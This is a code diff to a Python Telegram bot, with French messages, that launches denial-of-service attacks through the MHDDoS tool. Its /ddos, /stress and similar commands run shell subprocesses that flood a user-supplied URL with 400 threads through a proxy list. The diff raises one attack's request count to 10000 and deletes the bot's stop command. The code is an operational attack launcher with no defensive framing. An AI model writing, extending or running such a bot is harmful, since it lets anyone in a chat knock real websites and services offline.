@@ -30,7 +30,8 @@ def tmps(update: Update, context: CallbackContext):
   s = update.message.text.replace('/t', '')
   update.message.reply_text(f"Ok pour run pour {s} s")
   
-  
+ 
+
   
 def ddos_start(url):
   subprocess.call(f'python3 ~/MHDDoS/start.py GET {url} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
@@ -38,16 +39,11 @@ def ddos_start(url):
 def ddos(update: Update, context: CallbackContext):
   url = update.message.text.replace('/ddos', '')
   update.message.reply_text(f"METHOD: GET L7 THREADS : 400 pour: {s} s")
-  
-  with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
+  with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
     futures = []
     for _ in url:
       futures.append(executor.submit(ddos_start, url))
       chat_id = str(update.effective_user.id)
-      
-    for _ in url:
-      futures.append(executor.submit(ddos_start, url))
-      chat_id = str(update.effective_userddos_start.id)
 
 
 
@@ -81,7 +77,7 @@ def STRESS(update: Update, context: CallbackContext):
   update.message.reply_text(f"METHOD: STRESS L7 THREADS : 400\n\nSTRESS: Send HTTP Packet With High Byte pour: {s} s")
   url_str = str(url)
   print(url_str)
-  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py STRESS {url_str} 1 400 mhddos_proxy/list 100 {s}', stdout=subprocess.PIPE, shell=True)
+  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py STRESS {url_str} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
   output, error = p.communicate()
   if error:
     update.message.reply_text(f'Erreur : {error.decode()}')
@@ -193,19 +189,12 @@ def OVH(update: Update, context: CallbackContext):
             
       
       
-def stop(update: Update, context: CallbackContext):
-  update.message.reply_text("OK je refresh")
-  a = subprocess.Popen(f'refresh', stdout=subprocess.PIPE, shell=True)
-  output, error = a.communicate()      
-      
-      
 
 #Trigger des fonctions
 updater.dispatcher.add_handler(CommandHandler('t', tmps))
 
 updater.dispatcher.add_handler(CommandHandler('ddos', ddos))
 updater.dispatcher.add_handler(CommandHandler('start', start))
-updater.dispatcher.add_handler(CommandHandler('stop', stop))
 updater.dispatcher.add_handler(CommandHandler('bot', google_bot))
 updater.dispatcher.add_handler(CommandHandler('stress', STRESS))
 updater.dispatcher.add_handler(CommandHandler('cfb', CFB))
